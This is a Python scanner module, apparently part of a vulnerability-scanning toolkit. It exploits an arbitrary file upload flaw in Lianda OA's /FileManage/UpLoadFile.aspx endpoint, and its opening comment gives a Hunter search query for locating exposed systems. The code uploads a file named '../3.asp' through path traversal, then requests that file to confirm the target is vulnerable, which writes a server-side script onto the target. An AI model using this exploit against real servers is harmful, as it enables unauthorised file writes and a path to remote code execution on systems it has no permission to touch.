# hunter`web.body="Resource/js/LKSys_WindowControlScript.js"`
import ServerJ
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from requests.exceptions import Timeout
import os
import urllib.parse
import urllib.request
import re
import time
import ssl
import urllib
from urllib.parse import urljoin, quote
import ServerJ

bugName = '联达OA FileManage-UpLoadFile存在任意文件上传漏洞'


def scan_Lianda_OA_FileManage_UpLoadFile(url, proxies, headers, append_to_output, serverJ,bugName):
    path = "/FileManage/UpLoadFile.aspx"
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=00content0boundary00',
        'Accept': 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2'
    }
    data = '--00content0boundary00\nContent-Disposition: form-data; name="DesignId\n\n1\n--00content0boundary00\nContent-Disposition: form-data; name="file"; filename="../3.asp" \nContent-Type: image/png\n\n1234\n--00content0boundary00--'

    encodetext = url + path

    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        req = requests.post(encodetext, headers=headers, data=data, verify=False, timeout=3, proxies=proxies)
        if req.status_code == 200:
            path = "/FileManage/3.asp"
        if not url.startswith('http://') and not url.startswith('https://'):
            url = 'http://' + url
        encodetext = url + path
        req2 = requests.get(encodetext)
        if req2.status_code == 200:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send({bugName}, f"漏洞连接: {url}\r\n漏洞类型: 任意文件上传", ServerJ_switch=serverJ)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")

    except Timeout:
        append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
    except Exception as e:
        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
            append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
        else:
            append_to_output(str(e), "yellow")
